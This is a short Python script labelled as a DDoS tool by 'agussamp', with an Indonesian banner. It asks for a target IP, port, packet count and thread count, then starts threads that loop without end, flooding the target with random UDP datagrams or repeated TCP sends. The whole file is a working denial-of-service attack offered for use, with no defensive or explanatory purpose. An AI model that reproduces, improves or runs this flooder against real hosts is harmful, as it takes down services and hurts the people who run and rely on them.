#!/usr/bin/env python3
#Ddos by agussamp
import random
import socket
import threading
import os

os.system("clear")
print("------------------------------------------------------------")
print(" »   JAGAN ABUSEN TOLLS ABUSEN TANGGU SENDIRI «")
print(" »           TOOLS BY AGUSSAMPFS!       «")
print(" »         IZIN RAMAKE BANG AUSTING!       «")
print("------------------------------------------------------------")
ip = str(input(" AGUSSAMP | Ip:"))
port = int(input(" AGUSSAMP | Port:"))
choice = str(input(" AGUSSAMP | Gas Gak Ni?(y/n):"))
times = int(input(" AGUSSAMP | Packets:"))
threads = int(input(" AGUSSAMP | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" AGUSSAMP DATANG ")
		except:
			print("[!] SERVER DOWN AGUSSAMP! ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" AGUSSAMP DATANG ")
		except:
			s.close()
			print("[*] SERVER DOWN AGUSSAMP! ")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()